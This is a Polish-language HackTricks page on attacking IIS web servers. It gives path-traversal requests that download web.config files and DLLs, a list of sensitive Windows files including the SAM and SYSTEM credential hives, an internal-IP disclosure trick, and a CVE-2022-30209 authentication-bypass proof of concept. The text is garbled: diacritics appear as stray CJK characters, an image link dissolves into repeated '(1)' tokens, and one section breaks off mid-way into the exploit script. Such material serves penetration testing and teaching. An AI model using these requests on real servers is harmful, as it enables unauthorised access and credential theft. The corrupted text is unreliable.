# IIS - Usugi informacyjne internetu

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Testuj rozszerzenia plik贸w wykonywalnych:

* asp
* aspx
* config
* php

## Ujawnienie wewntrznego adresu IP

Na dowolnym serwerze IIS, gdzie otrzymujesz kod 302, mo偶esz spr贸bowa usun nag贸wek Host i u偶y protokou HTTP/1.0. W odpowiedzi nag贸wek Location mo偶e wskazywa na wewntrzny adres IP.
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Odpowied藕 ujawniajca wewntrzny adres IP:

```
If the server responds with an internal IP address, it may indicate a misconfiguration or a potential vulnerability. This information can be useful for an attacker to further exploit the system. It is important to report this issue to the system administrator or the appropriate authority for remediation.
```

Jeli serwer odpowiada adresem IP wewntrznym, mo偶e to wskazywa na bdn konfiguracj lub potencjaln podatno. Ta informacja mo偶e by przydatna dla atakujcego do dalszego wykorzystania systemu. Wa偶ne jest zgoszenie tego problemu administratorowi systemu lub odpowiednim organom w celu naprawy.
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Wykonaj pliki .config

Mo偶esz przesa pliki .config i u偶y ich do wykonania kodu. Jednym ze sposob贸w jest doczenie kodu na kocu pliku wewntrz komentarza HTML: [Pobierz przykad tutaj](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Wicej informacji i technik wykorzystania tej podatnoci znajdziesz [tutaj](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## Bruteforce odkrywania IIS

Pobierz list, kt贸r stworzyem:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

Zostaa ona utworzona przez poczenie zawartoci nastpujcych list:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

U偶yj go bez dodawania 偶adnego rozszerzenia, pliki, kt贸re go potrzebuj, maj je ju偶.

## Traversal cie偶ki

### Wyciek kodu 藕r贸dowego

Sprawd藕 pene opracowanie na: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
Podsumowujc, wewntrz folder贸w aplikacji znajduje si kilka plik贸w web.config z odwoaniami do plik贸w "**assemblyIdentity**" i "**namespaces**". Dziki tym informacjom mo偶na dowiedzie si, **gdzie znajduj si pliki wykonywalne** i pobra je.\
Z pobranych plik贸w Dll mo偶na r贸wnie偶 znale藕 **nowe przestrzenie nazw**, do kt贸rych nale偶y spr贸bowa uzyska dostp i pobra plik web.config, aby znale藕 nowe przestrzenie nazw i assemblyIdentity.\
Ponadto, pliki **connectionstrings.config** i **global.asax** mog zawiera interesujce informacje.\

{% endhint %}

W aplikacjach **.Net MVC** plik **web.config** odgrywa kluczow rol, okrelajc ka偶dy plik binarny, na kt贸rym polega aplikacja za pomoc tag贸w XML **"assemblyIdentity"**.

### **Eksploracja plik贸w binarnych**

Poni偶ej przedstawiono przykad dostpu do pliku **web.config**:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
To 偶danie ujawnia r贸偶ne ustawienia i zale偶noci, takie jak:

- Wersja **EntityFramework**
- **AppSettings** dla stron internetowych, walidacji klienta i JavaScriptu
- Konfiguracje **System.web** dla uwierzytelniania i czasu wykonania
- Ustawienia modu贸w **System.webServer**
- Wizania zestaw贸w **Runtime** dla licznych bibliotek, takich jak **Microsoft.Owin**, **Newtonsoft.Json** i **System.Web.Mvc**

Te ustawienia wskazuj, 偶e pewne pliki, takie jak **/bin/WebGrease.dll**, znajduj si w folderze /bin aplikacji.

### **Pliki w folderze g贸wnym**

Pliki znajdujce si w folderze g贸wnym, takie jak **/global.asax** i **/connectionstrings.config** (kt贸ry zawiera poufne hasa), s niezbdne dla konfiguracji i dziaania aplikacji.

### **Przestrzenie nazw i Web.Config**

Aplikacje MVC definiuj r贸wnie偶 dodatkowe pliki **web.config** dla konkretnych przestrzeni nazw, aby unikn powtarzajcych si deklaracji w ka偶dym pliku, jak pokazuje 偶danie pobrania innego **web.config**:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Pobieranie DLLi**

Wzmianka o niestandardowej przestrzeni nazw wskazuje na istnienie DLL o nazwie "**WebApplication1**" w katalogu /bin. Nastpnie pokazane jest 偶danie pobrania pliku **WebApplication1.dll**:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
To sugeruje obecno innych istotnych plik贸w DLL, takich jak **System.Web.Mvc.dll** i **System.Web.Optimization.dll**, w katalogu /bin.

W scenariuszu, w kt贸rym DLL importuje przestrze nazw o nazwie **WebApplication1.Areas.Minded**, atakujcy mo偶e wywnioskowa istnienie innych plik贸w web.config w przewidywalnych cie偶kach, takich jak **/area-name/Views/**, zawierajcych konkretne konfiguracje i odwoania do innych plik贸w DLL w folderze /bin. Na przykad 偶danie do **/Minded/Views/web.config** mo偶e ujawni konfiguracje i przestrzenie nazw wskazujce na obecno innego pliku DLL, **WebApplication1.AdditionalFeatures.dll**.

### Wsp贸lne pliki

Z [tego](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/) miejsca
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## Bd 404 HTTPAPI 2.0

Jeli widzisz bd jak poni偶ej:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
